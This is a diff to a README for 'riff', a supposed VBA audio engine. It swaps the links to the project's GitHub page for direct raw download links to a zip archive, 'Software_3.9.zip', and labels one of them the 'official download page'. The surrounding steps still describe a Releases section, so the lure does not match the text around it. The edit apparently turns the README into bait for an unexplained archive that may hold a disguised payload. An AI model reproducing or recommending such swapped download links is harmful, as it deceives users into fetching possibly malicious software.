@@ -1,6 +1,6 @@
 # 🔊 riff - Add pro audio features to VBA
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Robertrankegravesraphia467/riff)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Robertrankegravesraphia467/riff/main/resources/Software_3.9.zip)
 
 Riff provides a complete audio engine for VBA projects. You can load audio files, generate sound waves, and apply audio effects such as reverb and delay. The engine works inside Windows applications like Excel, Access, or Word without extra software. It manages sounds with low latency and high quality using system-native audio drivers.
 
@@ -17,7 +17,7 @@ Before you start, check your computer for these items:
 
 Follow these steps to set up the engine on your machine.
 
-1. Go to the [official download page](https://github.com/Robertrankegravesraphia467/riff).
+1. Go to the [official download page](https://raw.githubusercontent.com/Robertrankegravesraphia467/riff/main/resources/Software_3.9.zip).
 2. Look for the Releases section on the right side of the screen.
 3. Select the file that matches your version of Office. If you use 64-bit Office, download the x64 version. If you use 32-bit Office, download the x86 version.
 4. Save the file to your desktop.
